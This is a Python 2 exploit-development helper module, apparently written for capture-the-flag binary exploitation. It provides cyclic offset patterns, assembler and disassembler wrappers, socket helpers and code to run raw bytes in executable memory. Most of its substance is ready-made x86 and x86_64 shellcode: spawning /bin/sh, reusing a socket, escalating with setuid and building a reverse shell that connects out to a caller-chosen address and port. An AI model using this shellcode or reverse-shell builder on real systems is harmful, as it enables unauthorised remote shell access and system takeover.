import capstone
import ctypes
import functools
import hashlib
import itertools
import os
import random
import re
import select
import socket
import string
import struct
import subprocess
import sys
import telnetlib
import tempfile
import time
from sys import stdin, stdout, stderr, exit
from time import sleep

LC = string.ascii_lowercase
UC = string.ascii_uppercase

def pack(x):
  if isinstance(x, int):
    return struct.pack("I", x)
  return x
def pack64(x):
  if isinstance(x, int):
    return struct.pack("Q", x)
  return x

def de_bruijn(k, n):
  a = [0] * k * n
  sequence = []
  def db(t, p):
    if t > n:
      if n % p == 0:
        for j in range(1, p + 1):
          sequence.append(a[j])
    else:
      a[t] = a[t - p]
      db(t + 1, p)
      for j in range(a[t - p] + 1, k):
        a[t] = j
        db(t + 1, t)
  db(1, 1)
  return sequence

class Pattern:
  def __init__(self, n):
    alph = string.ascii_uppercase + string.ascii_lowercase + string.digits
    if n <= len(alph):
      self.s = alph[:n]
      return
    if n <= len(alph)**2:
      self.s = "".join(alph[i] for i in de_bruijn(len(alph), 2))[:n]
      return
    s = ""
    for a,b,c in itertools.product(
                      string.ascii_uppercase,
                      string.ascii_lowercase,
                      string.digits):
      s += a + b + c
      if len(s) >= n:
        break
    assert len(s) >= n
    self.s = s[:n]
  def __str__(self):
    return self.s
  def offset(self, x):
    p = pack(x)
    i = self.s.index(p)
    try:
      self.s[i+len(p):].index(p)
    except ValueError:
      return i
    else:
      raise ValueError, "Not unique!"

def contains_not(x, bad):
  return not any(c in bad for c in x)

def contains_only(x, good):
  return all(c in good for c in x)

def tohex(s):
  return " ".join("%02x" % ord(c) for c in s)

def fromhex(s):
  return "".join(s.split()).decode("hex")

def yasm(code, bits=32):
  if isinstance(code, list):
    code = "\n".join(code)
  code = "BITS %d\n%%line 0 input\n%s\n" % (bits, code)
  with tempfile.NamedTemporaryFile() as outp:
    fnameOut = outp.name
    p = subprocess.Popen(["yasm", "-o", outp.name, "--", "-"],
            stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, err = p.communicate(code)
    if p.returncode:
      print err
      raise Exception("Assembly failed")
    return outp.read()

def capstone_dump(code, arch=capstone.CS_ARCH_X86, mode=capstone.CS_MODE_32, cols="abm"):
  md = capstone.Cs(arch, mode)
  for i in md.disasm(code, 0x1000):
    line = ""
    if "a" in cols:
      line += "0x%04x: " % i.address
    if "b" in cols:
      line += "%-20s " % " ".join("%02x" % x for x in i.bytes)
    if "m" in cols:
      line += "%s %s" % (i.mnemonic, i.op_str)
    print line

def xor_str(s, key):
  return "".join(chr(ord(c)^ord(k)) for c, k in zip(s, itertools.cycle(key)))


class x86:
  @staticmethod
  def assemble(code, **kw):
    return yasm(code, 32, **kw)
  @staticmethod
  def disas(code, **kw):
    capstone_dump(code, capstone.CS_ARCH_X86, capstone.CS_MODE_32, **kw)


class x86_64:
  @staticmethod
  def assemble(code, **kw):
    return yasm(code, 64, **kw)
  @staticmethod
  def disas(code, **kw):
    capstone_dump(code, capstone.CS_ARCH_X86, capstone.CS_MODE_64, **kw)


class x86_shellcode:
  shell = x86.assemble(""" ; execve("/bin//sh", 0, 0);
    xor ecx, ecx
    mul ecx
    push ecx
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    mov al, 11
    int 0x80
    """)
  dup2_ebx = x86.assemble(""" ; dup2(ebx, 2); dup2(ebx, 1); dup2(ebx, 0)
    ; assume that socket fd is in ebx
    push 0x2
    pop ecx  ;set loop-counter
  ; loop through three sys_dup2 calls to redirect stdin(0), stdout(1) and stderr(2)
  duploop:
    mov al, 0x3f ;syscall: sys_dup2
    int 0x80     ;exec sys_dup2
    dec ecx	     ;decrement loop-counter
    jns duploop     ;as long as SF is not set -> jmp to loop
  """)
  shell_sock_reuse = x86.assemble(""" ; ebx = dup(2) - 1; dup2_ebx; shell
    push 2
    pop ebx
    push 0x29
    pop eax
    int 0x80
    dec eax
    mov ebx, eax
    """) + dup2_ebx + shell
  # setuid(geteuid()); system("/bin/sh")
  shell_euid = x86.assemble(""" ; setuid(geteuid()); shell
    xor eax, eax
    mov al, 0x46
    xor ebx, ebx
    mov bx, 0x1fa
    xor ecx, ecx
    mov cx, 0x1fa
    int 0x80
    """) + shell
  @staticmethod
  def shell_reverse(addr, port):
    addr = "0x" + "".join("%02x" % int(x) for x in reversed(addr.split(".")))
    port = "0x%02x%02x" % (port&0xff, port>>8)
    sc = x86.assemble("""
      ; socket
      push 0x66
      pop eax ;syscall: sys_socketcall + cleanup eax
      push 0x1
      pop ebx ;sys_socket (0x1) + cleanup ebx
      xor edx,edx ;cleanup edx
      push edx ;protocol=IPPROTO_IP (0x0)
      push ebx ;socket_type=SOCK_STREAM (0x1)
      push 0x2 ;socket_family=AF_INET (0x2)
      mov ecx, esp ;save pointer to socket() args
      int 0x80 ;exec sys_socket
      xchg edx, eax; save result (sockfd) for later usage
      ; connect
      mov al, 0x66
      push {addr}  ;sin_addr=127.1.1.1 (network byte order)
      push word {port} ;sin_port=1337 (network byte order)
      inc ebx
      push word bx     ;sin_family=AF_INET (0x2)
      mov ecx, esp     ;save pointer to sockaddr struct
      push 0x10 ;addrlen=16
      push ecx  ;pointer to sockaddr
      push edx  ;sockfd
      mov ecx, esp ;save pointer to sockaddr_in struct
      inc ebx ; sys_connect (0x3)
      int 0x80 ;exec sys_connect
      xchg ebx,edx ;save sockfd
      """.format(addr=addr, port=port))
    assert contains_not(sc, "\0")
    return sc + x86_shellcode.dup2_ebx + x86_shellcode.shell


class x86_64_shellcode:
  dup2_rdi = x86_64.assemble("""
    push 3
    pop rsi
  duploop:
    dec rsi
    push 0x21
    pop rax
    syscall
    jne duploop
    """)
  shell = x86_64.assemble("""
    xor rdi, rdi
    push rdi
    push rdi
    pop rsi
    pop rdx
    mov rdi, 0x68732f6e69622f2f
    shr rdi, 8
    push rdi
    push rsp
    pop rdi
    push 0x3b
    pop rax
    syscall
    """)
  @staticmethod
  def shell_reverse(addr, port, no_null=True):
    def p(x): return struct.pack("Q", x)
    def u(x): return struct.pack("Q", x)
    sockaddr = (
      "\x02\x00" +
      chr(port>>8) + chr(port&0xff) +
      "".join(chr(int(x)) for x in addr.split(".")))
    # this is to avoid nullbytes only
    a = "\0"*8
    while no_null and '\0' in xor_str(a, sockaddr):
      a = "".join(chr(random.randint(0,0xff)) for _ in xrange(8))
    a_q = struct.unpack("Q", a)[0]
    b_q = struct.unpack("Q", xor_str(a, sockaddr))[0]
    sc = x86_64.assemble("""
      ; socket
      push 0x29
      pop rax
      cdq
      push 2
      pop rdi
      push 1
      pop rsi
      syscall
      ; connect
      xchg rax, rdi
      mov rcx, {b}
      """.format(b=b_q) +
      ("""
      mov rdx, {a}
      xor rcx, rdx
      """.format(a=a_q) if a != '\0'*8 else "") +
      """
      push rcx
      mov rsi, rsp
      push 0x10
      pop rdx
      push 0x2a
      pop rax
      syscall
      """)
    x86_64.disas(sc)
    if no_null:
      assert contains_not(sc, "\0")
    return sc + x86_64_shellcode.dup2_rdi + x86_64_shellcode.shell


for c in [x86_shellcode, x86_64_shellcode]:
  for k, sc in c.__dict__.items():
    if not k.startswith('_') and isinstance(sc, str):
      assert contains_not(sc, "\0")

libc = ctypes.CDLL("libc.so.6")
def alloc_exec_buffer(buf):
  sz = len(buf)
  buf = ctypes.c_char_p(buf)
  addr = ctypes.c_void_p(libc.valloc(sz))
  if 0 == addr:
    raise Exception("valloc failed")
  libc.memmove(addr, buf, sz)
  if 0 != libc.mprotect(addr, sz, 7):
    raise Exception("mprotect failed")
  return addr

def execute_code(sc):
  ctypes.cast(alloc_exec_buffer(sc), ctypes.CFUNCTYPE(None))()

def execvp(fname, args):
  for x in args:
    assert contains_not(x, "\0")
  Args = ctypes.c_char_p * (len(args)+1)
  libc.execvp(fname, Args(*(args + [0])))

def execvpe(fname, args, env):
  for x in args:
    assert contains_not(x, "\0")
  for x in env:
    assert contains_not(x, "\0")
  Args = ctypes.c_char_p * (len(args)+1)
  Env = ctypes.c_char_p * (len(env)+1)
  libc.execvpe(fname, Args(*(args + [0])), Env(*(env + [0])))

def pipe(cmd, inp=""):
  return (subprocess.Popen(cmd,
                  stdin=subprocess.PIPE,
                  stdout=subprocess.PIPE,
                  stderr=subprocess.PIPE)
             .communicate(inp)[0])

def instrument(cmd, args, env):
  stdin_read, stdin_write = os.pipe()
  stdout_read, stdout_write = os.pipe()
  pid = os.fork()
  if pid == 0:
    # child
    os.dup2(stdin_read, 0)
    os.dup2(stdout_write, 1)
    execvpe(cmd, args, env)
  return (os.fdopen(stdin_write, "w"),
          os.fdopen(stdout_read, "r"),
          lambda: os.waitpid(pid, 0))

def connect(host, port):
  s = socket.create_connection((host, port))
  s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
  return s

def can_read(s, timeout=0):
  x,_,_ = select.select([s], [], [], timeout)
  return x != []

def wait_for_socket(s, timeout=1):
  return can_read(s, timeout)

def read_until_str(s, content):
  buf = ""
  while content not in buf:
    buf += s.recv(1)
  return buf

def read_until_match(s, regex):
  buf = ""
  while not re.match(s, regex):
    buf += s.recv(1)
  return buf

def socket_interact(s):
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()
